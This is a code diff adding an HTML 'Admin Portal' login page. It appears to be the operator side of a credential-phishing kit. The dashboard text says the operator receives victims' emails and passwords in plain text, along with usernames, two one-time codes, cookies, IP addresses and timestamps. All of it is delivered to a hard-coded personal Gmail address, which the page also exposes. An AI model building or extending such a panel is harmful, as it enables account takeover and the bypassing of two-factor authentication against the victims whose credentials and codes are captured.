@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Portal - Dummy Sign-In</title>
+  <meta charset="UTF-8">
+  <style>
+    .error { color: red; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+  <h1>Admin Portal</h1>
+
+  <div id="login">
+    <h2>Admin Login</h2>
+    <form id="adminForm">
+      <label>Email: <input type="email" id="adminEmail" value="blessedresult6@gmail.com" required></label><br><br>
+      <label>Password: <input type="password" id="adminPassword" required></label><br><br>
+      <button type="submit">Login</button>
+    </form>
+    <p id="loginStatus"></p>
+  </div>
+
+  <div id="dashboard" style="display:none;">
+    <h2>Admin Dashboard</h2>
+    <p>You are logged in as: <strong>blessedresult6@gmail.com</strong></p>
+    <hr>
+    <p><strong>How this works now:</strong></p>
+    <ul>
+      <li>User enters Email + Password → you receive them in plain text + a random OTP is generated and emailed to the <strong>user</strong></li>
+      <li>User enters Username → you receive it</li>
+      <li>User enters OTP 1 (sent to their email) → you are notified of the attempt</li>
+      <li>User enters OTP 2 → you are notified</li>
+    </ul>
+    <p>Every notification also includes Cookies, IP Address and Timestamp.</p>
+    <p>Check the inbox of <strong>blessedresult6@gmail.com</strong>.</p>
+  </div>
+
+  <script>
+    document.getElementById('adminForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const email = document.getElementById('adminEmail').value;
+      const password = document.getElementById('adminPassword').value;
+
+      try {
+        const res = await fetch('/api/admin-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          document.getElementById('login').style.display = 'none';
+          document.getElementById('dashboard').style.display = 'block';
+        } else {
+          document.getElementById('loginStatus').textContent = data.message || 'Wrong email or password';
+          document.getElementById('loginStatus').className = 'error';
+        }
+      } catch (err) {
+        document.getElementById('loginStatus').textContent = 'Server error. Is the backend running?';
+        document.getElementById('loginStatus').className = 'error';
+      }
+    });
+  </script>
+
+</body>
+</html>
